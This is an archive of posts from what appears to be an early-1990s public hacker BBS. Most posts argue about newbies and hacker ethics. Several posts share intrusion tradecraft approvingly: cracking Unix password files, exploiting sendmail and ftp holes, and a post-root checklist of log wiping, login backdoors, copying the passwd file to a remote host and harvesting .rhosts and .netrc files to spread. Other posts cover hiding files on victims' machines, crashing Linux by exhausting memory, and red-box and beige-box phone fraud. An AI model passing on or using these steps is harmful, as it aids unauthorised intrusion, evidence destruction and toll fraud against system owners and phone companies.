I can relate since i have a past which i am ashamed of, but i somehow 
survived and LEARNED from it.  i learned that the gratification and 
respect i gained from my peers right THEN is no match to the exilleration 
i will feel when i, along with a powerful underground, can CHANGE the 
system!

i am but i am but one person, who at this point knows very little.  what 
can i do?  learn humility and make valuable allys and feed from their 
brain...figure out whats wrong with the system.  when the time comes, if 
the underground is able to survive this injustice, and i hope to god it 
will, the results will be as potent as any orgasm...

Let me just make a few opoints clear.  I have been a member of the hack 
community for about 10 years now.  I look back on such systems as Metal 
Shop Private, Speed Demon Elite, Atlantis, Safehouse, etc, etc, etc...  
with mucu nostalgia.  But times have changed, and people have to realize 
that.  There will never be anything like the old days.  They are gone.  
Thats like saying you can bring back the 60's in todays world.  It cannot 
be done.  We are in a world where 100 times more people use computers and 
an electronic medium to communicate than in days past.  because of this 
explosion in use steps must be taken to protect the few sites remaining to 
the masses at absotely no charge.

Offering to give out hacked accounts to any schmo who would simply ask for 
them is ludicrous.  It is a very good way to get one of these few precisou 
open forums that exist free of charge, namely this one, removed for good.  
Common sense is a trait that was alive back then, but seems to be dying 
these days.  We did not simply log on to a public BBS back in the early 
80's and say "Hey d00ds, I got accounts, mail me for some" and we should 
not start doing that today.

This BBS could be used as a learning place for those who would like to 
understand the hack community, but its public nature will always prevent 
it from being a place to learn serious hacking information.  The levels of 
intelligence are too far spread out.  Only private, limited access systems 
will promote the distribution of illicit facts and figures.

The bottom line is very simple, but I will repeat it again.  This BBS is a 
great place to learn about the hack community, but do not be fooled in to 
thinking it is a forum for learning how to hack.  You want to learn the 
how part of it all?  I have one sure fre answer to help you out:  START RE
READING.

I run a totally open and public BBS such as this, and I have a philosophy 
that I am sorry to say is coming true:  SPOON FEEDING.

If you truly aspire to learn anything and to retain and build upon such 
knowledge you must take the initiative and learn it your self, you cannot 
expect people to spoon feed you everything you need to know.

Xenon:  I think you need to spot thinking of it all as some political 
crusade against the, as the kiddies here in 612 put it, Evil Pig Empire.
And everyone must realize that there will be no revival, there will be no 
return to the old days.  They are gone.  You cannot simply compare today 
with the past.  The situations are totally different.

I just like Phred, and I would love to see it stay up and grow.  Htoaster 
has put too much time in to it to have it degenerate in to some spoon feed 
session on hacking...  Read back a few hundred messages, he said this.

I must also say there is nothing wrong with serious discussion on software 
design or problems.  This type of discourse enlightens those intelligent 
enough to follow it.  Anyway, this is a long post.  And I am sure some 
people will whole heartedly disagree with me.  Fine, it is your right to 
do so.  Just do it intelligently.

ok, pyro.  im not tryin to get back the old dayz.  i guess my posts sort 
convey the idea that im lookin back and sayin, "why cant it be like it 
wuz."  i know times change and that change is necessary.  since we live in 
an explosive time, meaning technology is changing at such a fast rate, i 
see the current change as a chaotic mess.  now, if ya wanna get into a 
discussion of the values of chaos and anarchy, go ahead.  im not sayin its 
good or bad right now.  i dunno.  what i am tryin to say, though, is that 
people need to understand their roots.  history has a way of repeating 
itself since people dont look at the pst and learn from others mistakes.  
ive never been one for history...i alwayz blew it off as unimportant, but 
now, i am startin to realize that history is VERY important and i guess 
that my main concern and why i keep talkin bout the old dayz...not to 
bring em back, but so people will read about the past and mebbe gain an 
understanding, or more so, learn from the past and apply that knowledge to 
work towards the future.

everyone has their own personal goals they are workin towardz.  this is 
good.  this is diversity that is needed.  even people striving towards the 
same sort of goal have different perspectives of what theyre workin 
to achieve.  im not lookin fer a world full of cookie-cutter people all 
holding the same ideas.  add yer own flavoring to the soup and make it 
better for yerself.

WaReZ d00dz, cardersc0de headz, whatever, they all have their place.  im 
not passing judgement on anyone...i feel that if ya start to pass 
judgement and catagorize people, yer closin yer mind to the ideals of 
others.  that is why i ran a totally anon, free to all bbs (and will again 
when i get a new HD).  i wanted to provide a relaxed atmosphere where 
people could post their ideals and read the ideals of others.

well, this is sorta a hodge-podge post...forgive me...jus whaen i talk 
bout the "good ol dayz" im tryin to awaken people to the past so they 
might get interested and read and learn from it.  im not sayin what a 
hacker SHOULD be...thats different from person to person.  im jus sayin 
that there are a lot of definations out there and mebbe someones ideas 
might awaken somethin in you and add more flavor to yer life and ideals.

well, before i ramble on more...l9er

This Is Definitely The Shits, I Completely forgot about this system until

messages, and i see peopl trying to be elite, and think they can hack and 
phreak, sure anyone can hack/phreak if they try, but all these people are 
just leaching and not even Hacking or PHREAKING. Wow! I just figured out 
how to dialout! I'm a Hacker!
 
Probably the problem is, that this can be accessed by ANYONE, You see In 
My Area Code, It is probably the most shittiest, There are maybe 5 people 
in my area code that have Unix Accounts and would be able to access things 
because they would fuck things up royally, Makling my point, If someone 
gets a freenet installed in their town, that means more idiots get access 
and try to fuck things up for us

i was reading about sites here, and whoever was giving them out was a bad 
idea, If a Law Enforcement Agency Got A Hold of What You just said and if 
you posted one, this entire system would go down, now wouldn't you feel 
bad? Probably not, You Would Probably Pat Yourself on the Back, For TAKING 
down a good BBS For the Public, and think to yourself 'Oh Boy, At least I 
never got Busted'.
 
Anyone asking how to hack and phreak, I suggest You find out for yourself, 
I found everything I needed to Know By Learning the ropes of the system, 
sure, when i came into the modemmings scene in 1986, I was a WaReZ R0DenT, 
thinking I was Awesome. I then went on to Think I was COOL and accepted 
because I was in groups and etc, until finally i realized, they are 
stupid, and to find out more information you learn to go solo, and find 
out things for yourself, not by asking people for Accounts, password 
files, and other lame shit. 
 
Basically my point is, Learn Yourself And Dont Be a Leech.

Well, about port 25, the sysadmins here are rather touchy about the 
security of the system, so the watch people pretty well.  Actually, about 
half the time I send mail to that system via port 25, it doesn't ever get 
through!  I'm pretty positive I'm doing everything right, so I don't know 
what's causing it other than sysadmin activity?  Strange system?

Well, I think the problem is that most (or a lot) of the warez puppies 
think they are super hot shit cuz they just downloaded the newest game.  
This doesn't take much skill.  Warez guys who say they're "pirating cuz 
they don't like the big corporations, and they think info should be free" 
and all that shit, are fooling themselves.
Actually, a lot of the same goes for the HPA people, a good deal of whom 
think that having a passwd file means you're a hacker-elite.  It's 
nothing, and it will only get you so far in a quest to understand computer 
systems.
I say all this from personal experience (I used to be both, but not to 
some extreme).  A whole mess of the people I met while being an elite (HPA 
or warez) were basically supreme assholes.  No one was nice, and I got 
tired of it.  People like that rarely get along, so you get all kinds of 
fighting amongst the two groups.  It's pretty simple.

have some talent in a special field (however, making VGA loaders is still

    The most dangerous attitude expressed here is "go get a book and learn

exchange of information. Remember earlier in the thread, when everyone was 
talking about newbies on HPA boards? The greatest statement coming out of 
that was that these boards are a great place to learn and to exchange 
ideas. I agree with the specific complaint that idiots arbragging and 
handing out accounts which were not procured legitimately, an illegal 
enterprise that threatens the system. However, I think that discussions on 
security holes in Unix, ways to sneak through telnet-watchers, mailing 
anonymously are all discussions that are perfectly valid, and I would 
encourage them. To say "get out of here and read a book" is not conducinve 
to the free atmosphere. Basics get acquired pretty quickly, and the goal 
of a hacker is ewxploring. Let's support this goal by stopping the idiotic 
brag/rag wars, and equally stopping the massive posts on why everyone 
hates newbies / w3r3z d00dz etc. Instead, let's talk about how to make the

Subject: False Ideas Will Kill
Date: Mon Nov 15 17:07:41 1993

I personally think the whole idea of a free information society is invalid 
and dangerous.  Information should not be free.  It is the, in my opinion, 
responsibility  of each and every individual and organization to protec 
their own information, and provide for their own privacy.  It is not the 
responsibility of the Government or any other broad based institution to 
do so for us.

As for sharg of information to help everone become more educated.  Sure, 
this idea has much merit.  But lets face it, spoon feeding does no one any 
good.  Its a two way street, and to effectively have an excahnge of 
information in such a public forum you need a number of people on the same 
intellectual level discussing their views, while a few people may just 
kick back and watch.

But to sit here and read stupid wuestions non-stop all day is annoying.  I 
hate one way streets, and I know a number of other people do as well.  I 
have better things to do with my time than to tutor a bunch of people who, 
in my opinion, are too lazt to try and learn anything on their own free 
will.  So, yes, read a book so you have some concept of what you are 
talking about, then ask questions based on what you have read and what you 
would like to know more about.  But don't simply assume that  because 
there is some false notion of "free information" people are obligated to 
asnwer any neophyte question that gets posted.


Just to carry it a bit farther...  Poeple are so consumed with getting 
resuluts right away.  They do not realize that the people in the hack 
community who do have a large amount of knowledge have been at it for 
YEARS.  They have read every e-zone they have come across, they have read 
books, met people, scoured UseNet, tried things, etc.  Its a LONG PROCESS 
if you want ot be well rounded.  On the other hand, we get people today 
who feel that it is their right, because of this stupid notion of foree 
information,  to know everything that the old elite may know.  Wrong.  
Knowledge cannot be spoon fed into brains full of much.  Each indiviidual 
must take the task of learning to heart and put as much in to it, and even 
MORE in to it,  than those they would have teach them.  Simple.

Well, yet another long post from me.  And filled with typos too.  Neat-0,

"Connect <host>" command, it finds the address, and then tells me my

why is it so difficult for experienced hackers to give newbies a little 
help when it is neccessary -and- encourage the newbie to read a little, 
all without the massive attitude problem both cosmos and savoire have?

it is possible that the answer lies in the size of ego of each party, so 
"lighten up."

i am a newbie who asks questions and reads. i do fine, even tho' my 
questions may be annoying to those i ask, but it  should be a small matter 
to read as well.

anyways, thats my two cents.

I have no problem what-so-ever with helping newbies out...hell, I've been 
trippin da cyberspace fantastic fer 6 yrs and still consider myself a 
newbie...theres a shitload of information ta read up on out there...my 
problem is when sumone thinkin they're gods gift to hackers puts up sum 
bullshit post askin fer stupid shit.  those are the people i tell ta 
read...read about the past and present ta gain an understandin about da 
hacker world in general.

i am willing to answer questions to da best of my ability.  even if it is 
a "simple" question.  its da "stupid" ones i tend ta ignore.  fer example, 
if sumone asks fer help understand how a PBX works and how it can be used, 
thats ok, but if sumone jus asks fer numbers and passwords, that tells me 
that theyre not interested in learnin much x-cept how ta make a few free 
LD calls and mebbe show-off to their friends...

tellin sumone HOW a sysem works does not go against my principals, but 
givin people a free ride ta abuse a system is.  my view of a hacker is 
sumone who wants ta learn the ins and outs of a system not jus how ta use 
it fer selfish reasons.  there are 2 main tools ta this learnin...1) 
reading.  ya gotta read up on yer system.  do research on it , learn the 
basic principals behind how it works so you can move on to the next step: 
2) hands on experiance.  this is of equal importance as the first step.  
ya GOTTA play around on a system...find new and interesting ways ta use 
the system...use that x-periance to teach others and apply it to da next 
system ya encounter.

behind all this learnin, tho, ya gotta have a personal drivin force.  the 
posts i see on here that irk me are the ones by lost people, (no specific 
goal in mind other than sheer abuse), who are jus lookin fer a free ride.  
those are the people i tell ta read...read up on the past and apply that 
x-periance to form sum sort of personal goal...THEN start askin questions 
and work toward that goal...

First off, never butt in to something during the middle.  Secondly, if you

stemmed from the idotic post of Intruder and others who would ask 
like...hey how do I hack...and whos got the k0dez.
 
The problem is not my ego...it is the 'newbie' unwillingness to accept

While inspecting a friend's outside phone box today, I discovered that 
his is not like mine (ok, duh, I know).  Mine is a box that is made
by the Telco, and it merely slips off, exposing a set of posts and
wires.  However, when I opened his, which appeared to be a commercial
model, I discovered two posts, but also a modular jack!  We then 
ventured to his neighbor's, where the same set up existed.  Also, the
box had another section labelled "Telco Access" and required a spec
ial key to unscrew it.  Is this common, or is it just common in newer
subdivisions?  I did not even need to use my beige box, I just plugged
right in with a regular phone.  I have not seen this before, but then
I haven't been real observant either.

Cosmos, your posts fall into some clearly defined categories:

1) "The old days are over, and they will never return. Over, never return, 
got that?! Give up!! I did it all, and I did it better, so how dare you 
act as if hacking exists in the here and now instead of where we all know 
it exists, the past of my life. Stop that this instant

!" (End fictitious quote)
There are lots of people red boxing and even blue boxing, today. Of course 
these are nothing like the old days. In the old days companies like Sprint 
were in their infancy, and there was nothing like internet. Now there are 
new things to hack and new ways to hack them. And the old ways.

2) "If you would just go bacck and read the original posts, then you would 
know what I was talking about."

I've been keeping up with this base for quite a while now and have read 
every message on it.

3) "Stop talking about that, you're going to get us all in trouble!! And 
get htoaster's computer seized!"

It's htoaster's board, and what he allows on it is his business and his 
alone. He's taking the risks here and it's up to him to tell people what 
not to talk about. Periodically, he does this. Futhermore, notice all 
these [this message marked for deletion] messages? Refer to #2.

4) "Have you seen my article in Phrack? Phrack is   great, you should all
read it. Whaddaya think, huh, whaddaya think? It's awful large, but tou 
should all get it and read my article. I write for Phrack,  therefore I am 
hot shit."

Yes, I do read Phrack, and I'll get around to your article, but Phrack is 
too large and too boring and not very useful. The articles on operating 
systems have much more information than I need, and they appear to be 
taken straight out of a manual. They should have hung it up at 
#32 at the latest. Many phreaks argue that it is not really Phrack 
anymore, that's why #32 was Phrack Classic.

5) "Intruder is a lame warez d00d who can't write or spell"

Intruder is struggling to speak English, a foreign language to him! He may 
appear to be a 14  year old but he is not, don't be such an Anglophone 
bigot! We have users telnetting in from Europe and Argentina, I think that 
is COOL. Do you disagree with that?!

6) "ANI is the same as Caller ID, for you newbies"

Okay, seriously, you must have been oversimplifying. You just gotta know 
better than that.  ANI is used by operators and by 800 numbers to 
determine the calling number, like when you get a collect call. CLID is 
sent by the switch to the customer in areas where it's available. CLID is 
a product they're trying to sell.

7) "3l33t VMB: 1800-998-KRAD"

After all your bitching about WaReZ D00dZ you do this...
\
I hate to add to the flame fest here, but cosmos's worthless egotistical 
rigamarole has already sent this message base to pot. Next he'll be

My whole point is simple:  I am willing to help people who wish to leran 
something if, and only if, they are up to the challenge of puutting as 
much or more effort in to learning that I am putting in helping.  I am not 
going to sit here and tell me exactly how to do things, thats not the 
point.  How can anyone expect to learn something by being spoonfed?  

Lets look back.  This whole topic started because some stupid, ignorant 
little fools were posting shit about needing accounts and how they could 
easily hack them.  I responded with a long post about the problems with 
asking for such idiot information on a public BBS and that hacking 
accounts is tupid and inconsequential compared to real hacking.  

Then a bunch of stupid fucks started babbling about how people like me 
were holding back some stupid ideas of "the old days" of open sharing and 
learning.  I am sorry, people who asked such questions back then were 
flamed as they are now.

Cosmos then joined in with some excellent posts on the differences between 
today and 10 years ago and how stupid little kiddies can think they will 
learn oh so much in 1 week what took many people to learn in many years.

If anyone honestly thiks they are going to get some real hacking info from 
theis subboard on a large public BBS they are wrong.  It will not happen.  
No one in their right mind who knows anything worth knowing is not going 
to go off and explain in detail anything to anyone here.  Wait, thats a 
double negative.  Sorry.  Anyone who knows anything is NOT going to spit 
it out for all the people of the world to read.  That is ludicrous.

Ideas and discussion are great, but for people to sit here and TEACH 
people how to hack is just plain stupid.  Thats a fact, deal with it.

If someone were to ask me a very informed question about somehting they 
have worked on for quite a while I would answer it.  But before you aks a 
question people should think to themselves: "Do I know what I am talking 
about?  Have I exhausted the resources I have available to me on a 
personal level?  Have I read up on this subject?  Can I read more?  Is my 
question informed enough so that those who would answer it are able to 
withoout getting confused by it?"  and may more.

Hacking is NOT just getting accounts and using a system.  It goes way 
beyond that, and anyone who truly likes hacking and takes it seriously 
realizes that it is an intense passion for security and how it works.    
And not just security, but the system in general.  Accounts are a dime a 
dozen.  Any idiot can get accounts.

So, all of you people who would wish to know more.  When you have a 
uquestion ask yourself this one simple one first:  "Have I even tried 
reading some man pages on this subject yet?"  If you answer no to that, 
then you really shoud find a new hobby.  And the man pages are just the 
first of many places to find information.

And last of all:  BE PATIENT.  Nothing comes up and smacks you in the ass. 
 You have to spend a lot of time on it.  If you really have no tother 
interest in anything in the data world than hacking you really should give 
up now.  You need to be informed of the larger data world.

I could go on for a few hundred more lines, but I won't (I would not want 
to subject you to anymore of my many typos).

So, remeber, if anyone wishes to ask questions of those who may know the 
answer or provide some insight on where to find the answer please take the 
time and effort to atleast try and solve it yourself or be informed as to 
the nature of the question.  Its simple, but its not easy.

myself.
.  Here is a ton more shit than cracking accounts, as a matter o fact any 
newbie who knows how to compile and run a program on UNIX can do it.  The 
real fun is in getting accounts not by cracking pwords, but by going thru 
holes, like the sendmail one a while ago was good(no it does not work now

anymore" is ludicrous and outright false.  Shit, I just performed it this 
morning on my own site.  The only way the sendmail bugs do not work is if 
the admins are smart enough to a) patch their binaries or b) install the 
latest version.

I would estimate that a vast quantity of sendmail servers are still loaded 
with the bug(s).  On another note, I also found some sites with the 
infamous quote cwd ~root bug in ftp today.  If you know what you are doing 
you will recognize that one.  Needless to say, that one is a bit more rare

up with this. First the yp stands for yellow pages.  This is a map or set 
of nicknames for databases that are use throughout a network.  It hs to do 
with NIS dta bases. Basically you ypcat a nicknamed data base to cat it.  
The actuall passwds are in passwd.byname but ypcat passwd does just fine.

Hello Hagbard...
Here's a little bit of info about Shadowed password files.  I am most 
familiar with the SunOS implementation, but I have examined (ie tried to 
hack) others on Ultrix and SVR4.  In a non-shadowed passwd file, the 
passwords are the encrypted strings in the second entry of each line:

mylogin:Rh62jpr4:0:something:something.etc:you-get-the-idea:more:csh

or thereabouts.  As has been pointed out, it is generally 
impossible/impractacle to decrypt the encrypted strings, but programs to 
encipher dictionary entries and then compare them to the encrypted strings 
can get 10-30% of the passwords (this is highly variable; depends on the 
difficulty of the passwords and also the time you spend cracking-- it 
isn't practical to spend an extra 12 hours to get an extra handful).  
Everyone has read access to the /etc/passwd file; you can see the obvious 
security hole here.  The shadowed password file is an additional file 
containign the real passwords that can't be read...the original passwd 
file has something else substituted in the place of the encrypted 
password.

mylogin:##mylogin:1234:something:somethingelse.......

on SunOS, where the real encrypted string would be hidden in 

mylogin:*:1234:somemorestuffthatsactuallyimportantifyoulook:.....

AT&T SVR4 has the passwords in /etc/shadow; hence 'shadowed passwords'.

Figuring out how to read the file is the real trick....

        Yes, I know that mylogin is root in the first example...

What does an 'x' in the password field of a passwd file mean?  Normal
accounts have visible passwords, but some (i.e. uucp, daemon, etc) have
an 'x' in the password field... are these passwords shadowed?

It just means that it is an invalid login.  The crypt() function encrypts
to 13 characters, no matter what the input is, so it could never evaluate
as equal to a one character string.

Does anyone know where I can get ahold of a good PW cracker that compares 
the unix pw file to a dictionary.  I would like a Mac version but any will 
do.  Thanks for your help.

Ok....
    Archie for Crack; the latest version is 4.1, I think.  It is for Unix, 
and has a number of useful options.  Very interesting; it can run across a 
number of networked machines of different types, also it can set itself up 
automatically when you get the archive file.  I don't know of any versions 
for Macs, who'd want one?
    If you managed to find a site w/o the password file being shadowed, 
I'd like to hear about it.  Leave a message here and we'll discuss...

cracking roughly 10,000 accounts at that college and a few others. He

What do you mean managed???  There are shitloads of unshadowed password 
files out there.  As for cracking them all just get one and that should be 
enough to grab root on any given machine.  If they have an unshadowed pw 
file they can probably be hit with rdist or other goodies...

cosmos--
    I doubt that cracking a given pw file  'should be enough to grab root 
on any given machine'.  At my site, the passwd is shared between a number 
of administrators, but is a very difficult one (see a file on
 password security), ie, no recognizable words, alphanumerics w/ special 
[!@#$%^&}] characters, control codes, etc.  But I do appreciate the 
input...

WEll Fastjack, I dont think cosmos was talking about grabbing the actual 
passwd to the root acount from the unshadoewd pword file.  He meant 
hacking it out once in the system.  I assume that he meant once your in 
there is usually a way to get root.  Like playing with suid programs, and 
general mayhem you can get done with any account really.  Once you get an 
account, unless the system is really high security you can probably get 
root if you know what your doing.
 
    ALSO, someone stated that a "x" or "*" means that it is an invalid 
account.  That's not really true.  As I have seen "*" used to mark a 
shadowed passwd file.  It's used as a marker.  I have also seen and heard 
of something like "x" bieng used to fill a place in the passwd field of a 
invalid account.  Like they do it to uucp and other normally default 
accounts.  This renders it impossbile to login to that account, but they 
need to be there for certain system operations.

Please dont condescend me.  You are the one who does not know what he is

several administrators.  Once you have ANY given shell account you only 
then need to exploit any given number of holes and work from there.  As 
for reading about it, I could lecture at hand for hours about password 
file manipulation.  Read carefully before you try to appear

Ok cosmos...
    *sorry* for the _misunderstanding_.  Guess I should stop trying to 
admin and just get back to cracking.  I was in err; it is indeed possible 
to go root on *many* machines utilizing well-known security holes.  It 
must be remembered that any site w/o a shadowed passwd file is <unlikely> 
[to put it midly...heheheh] to apply the patches that CERT deems 
necessary.  Now that we have gotten past that point, why don't we discuss 
something interesting, like what you'd do with root once you had it.  
Besides the obvious, like set up an account for yourself (if no cron job 
runs to diff it w/ the hidden backup) read mail spool (booooooring) erase 
yourself from audit logs (ho hum, ho hum).  Other that utilizing existing 
gains to allow further penetration, what is there?  From someone who has 
experienced the phenomena of avatar, it ain't all it's cracked up to be.

experience with UNIX as an OS.  In 1985 I picked up an ATT UNIX miniframe 
running SYS V rel 2 with some BSD extensions and some rel 3 extensisons 
added later.  
 
What do you do??  Depends on your own personal choice.  I always just 
enjoyed the hack initself.  Once I got root, that was that.  On to the 
next machine.  I never destroyed shit or made accounts for friends etc...
 
The only thing I can recall ever doing that was beyond getting root was 
downloading/transfering source code for AT&T Sys V rel 3.2.2 a few years 
back.

Okay, I'm not sure what you're asking...
Do you mean the Internet IP numbers for Net BBSs that are local to you or  
phone numbers for  PC boards near your school?  Either way, best bet is to 
ask around there-- get to know some people who know what they are doing, 
ask questions, but don't ask questions you don't have to.  Play around- do 
some work-- nobody apreciates giving away info to somebody who wants it 
all handed on a silver platter.  Too many people like that on the Net.  
Just read, listen, and keep your mouth shut about anything you don't know 
about....
    About code-cracking:  If you mean to crack Unix systems, it's best to 
get at least one legit account (I assume you have one) and proceed from 
there.  Also, *don't* hack your own site-- they can get you easier and 
hurt you more if you do--and it doesn't help you in any way to crash your

 Okay....What I meant by 'stop trying to admin and get back to cracking 
was that I've been spending amore time recently running shit (and I'm not 
used to it from an admin's view, but I need the experience) that I haven't 
been 'just cracking' like I used to-- Of course, I was stupid then, and I 
know a lot more than I did when I was younger-- but the net effect is 
similar.  Instead of deciding whether to guess passwords or write simple 
trojan scripts, I now ponder the advantages of getting an Intel-based Unix 
on a 486 against a used Sun workstation.  Guess it's good to broaden your 
horizons....From *both* points of view.

I can't believe that this is as lively as this sub gets....

First steps for me AFTER gaining root:
1) Check for the existance of security programs. Look in the crons, 
/etc/security, /usr/adm/messages*, /etc/syslogd.conf, and any others that
come to mind.

2) Remove myself from ALL logs possible. (utmp, wtmp, lastlog, and any 
other's found in syslogd.conf.

3) Secure myself in (patch login, set up a port, rcp the passwd file to a 
remote host)

4) Check out the system resources; How often do the telnet? Do they use
tip or cu? If I feel that the site will yield something fruitful thenm
I set up the appropriate patches, etc. If not....

5) Upload my find script (looks for alot of shit) and run it. Searches
for *.zip *.exe *.c .netrc .rhosts *.whatever.

6) Check out the .netrc files! These things are great for infecting other 
systems. type 'man netrc'

7) Copy all .netrc and .rhosts files to my machine to insure future access 
if my account dies or my patch is removed.

8) Browse.... Erase core files (hell i don't know)... Look at mail. If 
they use cu and have it set up see if I can use it. Wow another Internet 
outdial.

Well anyway I am recieving a talk request... I will respond to any and all 
comments from users.

Forgive me if I am intruding, but what do you mean "board"??  If you are 
referring to a bulletin board based server like yabbs then you are not 
going to find a multitude of them.  This is not ms-dos and windows weenie 
land.  Now explain to me why you would want to break into an internet BBS 
anyway...90% if not 100% of them are public and accessible anyways.  

To go on, if you want to compromise the security on an internet site then 
the first approach is not to ask "hey, how do I do it" but to learn and 
absorb the operating system.  This is not the easiest of tasks.  Unlike 
the 80's, the internet is now relatively secure to the average attacker.  

Learn UNIX.  Learn it, study it, and live it.  Get all the books you can 
about UNIX, find a local provider, school, etc... and get aquainted to 
using UNIX.  If you are on an intel platform get netBSD(or LINUX if you 
are inclined), macintosh get macBSD.  Play with it and expirement with 
everything.  Yes, welcome to hacking 101.  More books, time, and sweat 
thatn any damn college course you will ever take.

NEVER beg for accounts, and expect a silver platter to be handed to you.  
Hacking is not picking up some cool t-philes and typing some commands.  It 
is a philosophy and an intense understanding and knowledge of computers 
and operating systems, and is not limited to the uebercracker(thank you 
Dan Farmer) but to any person who accomplishes their goal through 
undocumented or abstract methods.

Chasing crackers:
There has gfot to be no greater experience in hacking than testing your 
knowledge against another cracker's. I don't mean voice where you have 
this little debate about who knows more or who is better. I mean online 
where you don't know shit about him and he doesn't even know you see him. 
This is especially nice if you have a few ways into the system and he is 
using a hacked account. I have had this experience a few times and it is a 
blast. I was on this small edu site with like twelve users and I fucking 
gave this dude hell. Found all the ways I knew of to get root and disabled 
them (rdist, etc); Found out where he was coming in from i case I needed 
to hack his site. Looked at his .history to find out what he was doing. 
Went to the current dir he was in amd moved the files he had put up 
elsewhere for future use, and kicked him off with a little message ketting 
him know I was a cracker and told him to fuck off and stay off my site..
That issued the challenge and he was right back. ps showed him doing a cat 
> gimme to attempt to get root but it did not happen. I just toyed with 
him for a while. Then wrote a little c program to make him sit there for a 
long time and then log him out and put it in his passwd entry. I could 
send him all sorts of hateful messages telling him how lame he was and 
when the time limit ran out he would be logged out and he would try it 
again. Finally he gave up. Christmas modemer..... hahah

UNIX: cosmos is right about learning Unix inside and out. I am far from 
this but I feel that I know more than most (which isn't saying that much.)
I have read so many books on Unix that I cannot even list them all because 
I forgot some of the title's. I remember one I spent a week reading this 
one book at a local University cos I could not get a library card unless I 
was a student. It took me an hour to get to the school on the bus and an 
hour to get back, but I was committed. I feel that if you are going to 
hack then you should do as much as you can by specializing in just a gfew 
fields. No one person can master everything but if you take your skill and 
put it together with a handful of people that you know and trust then you 
will have yourself a nice little team of hackers. Otherwise you are just 
going to be left out and you will just be doing the same thing over and 
over again. One time I spoke to an ex hacker and he told me he quit 
because hacking reminded him of the old cocaine commercial with the guy 
walking around in a circle. He is correct about so many hackers out there. 
Most never learn to program and really don't care to because they do not 
want to commit themselves to LEARNING something. They feel that what they 
are doing is fun and that there is no reason to learn how to program. I 
admit that at one time I felt the same way. Then I learned C. The little 
that I know about programming C on Unix has helped me immensely in my 
hacking exploits. Now I can't believe I ever hacked without it.

Gives you something to think about.

Adonis has gvot to be lamest person. To make such a broad post like that 
even as a joke is fucking stupid. I could take the average computer user 
and teach him how to safely hack banks, schools, companies, etc in less 
than a week. If you were a good hacker you would realize that it doesn't 
matter how may systems you occupy, it's what you can get from each system. 
I will never be impressed by the quantity of systems a person has, I will 
only be impressed with the quality of the systems and the hacker's ability 
to yield the most from each system. Adonis has only told us war stories of 
his exploits (which are gvery vague) and he is just calling us lame. This 
tells me that he is just a beginner. Anyone that is really good realizes 
that he was once a novice and his knowledge did not come easy. 
Furthermore, he would be willing to help those starting out by helping 
them learn the things that they need to succeed in their projects, etc.

Adonis, I hope that one day you will learn what hacking is all about. I 
know by experience that obtaining systems has got to be the easiest part 
of hacking. Utilizing the given resources given and yielding information 
from them is a little more complex. Each system you get in can serve some 
purpose, be it as an ip scanner, carrier scanner, modem access to a 
certain area code, a password cracking site, an archive site, a place for 
you to test your programs, a place to set up a mail address, a bbs site, a 
contact site for group members (if you are in a group) and much more. If 
you have skills that are exceptional, I would like to hear about them. 
Judging from your posts I can tell that the only things you know about 
hacking are running scripts that give you root (rdist, div/0, etc) and 
Cracking passwd files. You may have some patches but so do tons of people 
who will never learn how to program.

This can be a big flame war or you can turn this into a learning 
experience for everyone including yourself.

Watch out for Nomad you guys.
Weak. Let's get some discussion going on here. Surely someone has some 
questions that need to be answered, I know I do.

Hopefully that is the end of the flames but I know someone will have 
something to say.

Now for my question. I am looking for a way to hide files under unix. I 
know that all the information is kept in dirent structures found in 
dirent.h but I have been toying around and have not been successfully able 
to accomplish this task. I spoke with someone the other day and they told 
me that I needed to edit the inode tables in the  superblock (I think 
that's what he said, sounds crazy) and remove the inode from the available 
list so that the file will not be overwritten. The only thing I am worried 
about is that they file might get big enough to go over into other inodes 
that will later be allocated and used. Does anyone know anything about 
this or have files pertaining to it. I would really appreciate it.

well the standard filename "..." can be used, but is old
If you are hiding it with inodes, etc, then you can't be expecting to 
access it all the time...  Why not just encrypt it?

Another way to do things that is wierd, is to make a directory, copy the 
file in there, and mount a filesystem on that directory.  People can not 
get to the file via normal ways, until the filesystem is de-mounted.

insecure, and thats what having an attitude is, insecurity.  Don't even 
bother replying if your gonna respond in the same way.
 
Hacking isn't about competition, it's not about who's superior, hacking 
should be something you do or yourself, to learn, and help others learn.
 
Unix holes are no big deal, there are hundreds of scripts out there that 
exploit every hole ever found, holes that Sun hasn't patched yet, are you 
knowledgable enough to find them all on your own?  Nobody is..

Panzer, if I mount a file system then that will be a flag pointin to the 
file I wish to hide. When the admin types mount and sees a new entry where 
there was none before he is liable to just umount it. Crypting shit is ok 
but I want other programs to be able to utilize my files. Fuck having to 
decrypt it within a patch or something to add output. The ability to hide 
it, make it there for about say 2 secs and then hide it again is much more 
favorable.

Explain a little more of what you want to do.  Crypting can be done in a
script.  You just enter the passphrase at the beganning, and then after the
processing of the encrypted data.

Remember that by storing data on someone elses machine, it is inherently
unsafe, and that sooner or later it will be discovered.

Basically if you run that simple little program on a Linux box, you will 
completely crash the machine.  It will not come back except via reboot.  
You can also just write a program that recursively calls itself allocating 
100k of mem or something.  This way you hog mem as opposed to proccesses.  
All depends what your objective is.

Linux comes with some open holes you should fix.  Either as an exercise to 
the readers, or ask if you want to know some of 'em...

All systems come with holes.  While people are mentioning them in linux,
here is a pretty big one in any of the BSDs.  If people install the system
but never install the crypted password stuff (it is a seperate package
due to export restrictions, but trivial to install) it doesn't encrypt using
any method in /etc/passwd.master (the shadow file).  So if the account is 
*'ed out to make it not loginable you can just type * in the password
field...

most people use the security stuff though...

Their is no goddamn way you can manually hit the keys at the exact timing 
for the required tone...get a memory dialer and program the priority keys 
for 5 *'s  

heh.

the radio shack dialer plays the codes way slow as well, compared to what
they really sound like.  If you want to compare them in a nice and easy way
find a payfone that doesn't mute the handset when you drop quarters in
(lots of handsets still don't), tape the quarter tone, digitize it, and then
digitize your redbox.  Put one on the left channel and one on the right 
channel.  Pretty big difference in speed, and the freqs are a little off
as well if you us a 6.5535 crystal (6.5 is better, 6.4xxx something is
supposed to be the best).

All of this redbox stuff is quite lame though.  You aren't learning about
the system, just abusing it for your own personal benefit.  They might have
been cool a few years ago, but who cares these days.  Is it really that big
of a deal to pay a few dollars for ld calls...

If you really want a cool box look at the Hacktic demon dialer.  I saw the
one that the 2600 people own a few years ago.  Pretty impressive.  And they
claim it can be put into a very small case (about the size of a memory
dialer, maybe smaller).  Lets you pretty much program any two channel (or 
maybe more) sound you want, set them up for hotkeys, has a access code you
need to type in to get to the fun stuff (otherwise it is just a dtmf 
player).  expensive though...

Greetings, all .
      I was curious if anyone out there knew where I could locate
 a phile or two about the setup of a pirate radio station . The
